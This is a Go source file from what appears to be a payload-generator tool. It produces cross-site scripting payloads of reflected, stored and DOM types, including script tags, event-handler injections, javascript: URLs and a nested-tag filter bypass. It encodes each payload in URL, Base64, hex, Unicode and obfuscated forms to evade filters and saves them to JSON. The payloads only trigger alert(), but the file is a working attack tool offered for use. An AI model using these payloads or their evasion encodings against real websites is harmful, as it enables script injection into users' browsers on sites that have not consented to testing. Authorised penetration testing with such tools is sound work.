package modules

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/rajaabdullahnasir/Custom-Payload-Generator/utils"
)

// XSSPayload defines the structure for an XSS payload
type XSSPayload struct {
	Type         string `json:"type"`
	Payload      string `json:"payload"`
	URLEncoded   string `json:"url_encoded,omitempty"`
	Base64       string `json:"base64,omitempty"`
	HexEncoded   string `json:"hex_encoded,omitempty"`
	Unicode      string `json:"unicode,omitempty"`
	Obfuscated   string `json:"obfuscated,omitempty"`
	Bypass       bool   `json:"bypass"`
	Original     string `json:"original,omitempty"`
}

// GenerateXSSPayloads creates multiple XSS payloads with encoding and obfuscation
func GenerateXSSPayloads() ([]XSSPayload, error) {
	var payloads []XSSPayload

	types := map[string][]string{
		"Reflected": {
			`<script>alert({n})</script>`,
			`<img src=x onerror=alert({n})>`,
			`<svg onload=alert({n})>`,
			`<iframe srcdoc="<script>alert({n})</script>">`,
		},
		"Stored": {
			`<body onload=alert({n})>`,
			`<input autofocus onfocus=alert({n})>`,
			`<details open ontoggle=alert({n})>`,
			`<math href="javascript:alert({n})">`,
		},
		"DOM": {
			`<a href="javascript:alert({n})">`,
			`<img src=x onerror=alert({n})>`,
			`<scr<script>ipt>alert({n})</scr</script>ipt>`,
			`<svg><desc><![CDATA[<script>alert({n})</script>]]></desc></svg>`,
		},
	}

	for t, templates := range types {
		for _, tpl := range templates {
			for i := 1; i <= 2; i++ {
				raw := strings.ReplaceAll(tpl, "{n}", strconv.Itoa(i))

				payloads = append(payloads, XSSPayload{
					Type:       t,
					Original:   raw,
					Payload:    utils.ObfuscateXSS(raw),
					URLEncoded: utils.EncodeURL(raw),
					Base64:     utils.EncodeBase64(raw),
					HexEncoded: utils.EncodeHex(raw),
					Unicode:    utils.EncodeUnicode(raw),
					Obfuscated: utils.ObfuscateXSS(raw),
					Bypass:     true,
				})
			}
		}
	}

	return payloads, nil
}

// SaveXSSPayloadsToFile writes XSS payloads to JSON
func SaveXSSPayloadsToFile(payloads []XSSPayload) error {
	data, err := json.MarshalIndent(payloads, "", "  ")
	if err != nil {
		return err
	}
	path := filepath.Join("payloads", "xss.json")
	return os.WriteFile(path, data, 0644)
}

// SaveXSSPayloads outputs the payloads using the generic JSON output utility
func SaveXSSPayloads(payloads []XSSPayload) error {
	return utils.SaveAsJSON(payloads, "xss")
}

